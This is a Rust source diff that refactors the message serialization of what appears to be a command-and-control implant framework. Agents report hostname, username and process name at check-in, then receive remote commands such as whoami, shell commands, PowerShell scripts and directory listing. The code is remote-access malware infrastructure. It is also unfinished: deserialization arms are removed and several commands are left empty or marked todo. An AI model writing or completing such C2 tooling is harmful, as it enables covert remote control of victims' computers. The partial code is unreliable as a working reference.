@@ -283,10 +283,10 @@ pub enum MessageBody {
     } = 0x0002,
     Beat {
         agent_id: u128,
-        command_results: CommandResults,
+        command_results: Vec<CommandResult>,
     } = 0x0003,
     Command {
-        commands: Commands,
+        commands: Vec<Command>,
     } = 0x0004,
 }
 
@@ -338,7 +338,7 @@ impl MessageBody {
                 packer.finish()
             },
             MessageBody::Command { commands } => {
-                for c in &commands.0 {
+                for c in commands {
                     match c {
                         Command::Whoami => {
                             packer.pack_u32(CMD_WHOAMI);
@@ -351,14 +351,8 @@ impl MessageBody {
                             packer.pack_u32(CMD_RUNPS);
                             packer.pack_bytes(script.as_bytes());
                         },
-                        Command::Cd { target_dir } => {
-                            packer.pack_u32(CMD_CD);
-                            packer.pack_bytes(target_dir.as_bytes());
-                        },
-                        Command::Ls { target_dir } => {
-                            packer.pack_u32(CMD_CD);
-                            packer.pack_bytes(target_dir.as_bytes());
-                        },
+                        Command::Cd { target_dir } => {},
+                        Command::Ls => todo!(),
                         Command::RunProcess => todo!(),
                     }
                 }
@@ -367,7 +361,7 @@ impl MessageBody {
             MessageBody::Beat { agent_id, command_results } => {
                 packer.pack_u128(*agent_id);
 
-                for c in &command_results.0 {
+                for c in command_results {
                     match c {
                         CommandResult::Success { command_id, data } => {
                             packer.pack_u32(*command_id)
@@ -392,53 +386,30 @@ impl MessageBody {
         let body_id = unpacker.unpack_u32()?;
 
         match body_id {
-            MSG_CHECKIN => Ok(Self::Checkin { 
+            0x0001 => Ok(Self::Checkin { 
                 agent_pubkey: unpacker.unpack_32bytes()?, 
                 os: unpacker.unpack_utf16le_string()?,
                 hostname: unpacker.unpack_utf16le_string()?,
                 username: unpacker.unpack_utf16le_string()?,
                 process_name: unpacker.unpack_utf16le_string()?,
             }),
-            MSG_CHECKINACK => Ok(Self::CheckinAck { 
+            0x0002 => Ok(Self::CheckinAck { 
                 session_pubkey: unpacker.unpack_32bytes()?,
                 agent_id: unpacker.unpack_u128()?,
-            }),
-            MSG_BEAT => Ok(Self::Beat { 
-                agent_id: unpacker.unpack_u128()?,
-                command_results: unpacker.unpack_bytes()?,
-            }),
-            MSG_COMMAND => Ok(Self::Command { 
-                commands: () 
             }),
             _ => anyhow::bail!("Invalid request id"),
         }
     }
 }
 
-pub struct Commands(Vec<Command>);
-
-impl Commands {
-    pub fn serialize(&self) -> Bytes { }
-    pub fn deserialize(buf: Bytes) -> anyhow::Result<Self> { }
-}
 pub enum Command {
     Whoami,
     RunCmd { command: String },
     RunPs { script: String },
     Cd { target_dir: String },
-    Ls { target_dir: String },
+    Ls,
     RunProcess,
-}
 
-impl Command {
-    pub fn serialize(&self) -> Bytes { }
-    pub fn deserialize(buf: Bytes) -> anyhow::Result<Self> { }
-}
-
-pub struct CommandResults(Vec<CommandResult>);
-impl CommandResults {
-    pub fn serialize(&self) -> Bytes { }
-    pub fn deserialize(buf: Bytes) -> anyhow::Result<Self> { }
 }
 
 pub enum CommandResult {
@@ -446,7 +417,3 @@ pub enum CommandResult {
     Error { command_id: u32, winerror: u32, data: Bytes },
 }
 
-impl CommandResult {
-    pub fn serialize(&self) -> Bytes { }
-    pub fn deserialize(buf: Bytes) -> anyhow::Result<Self> { }
-}
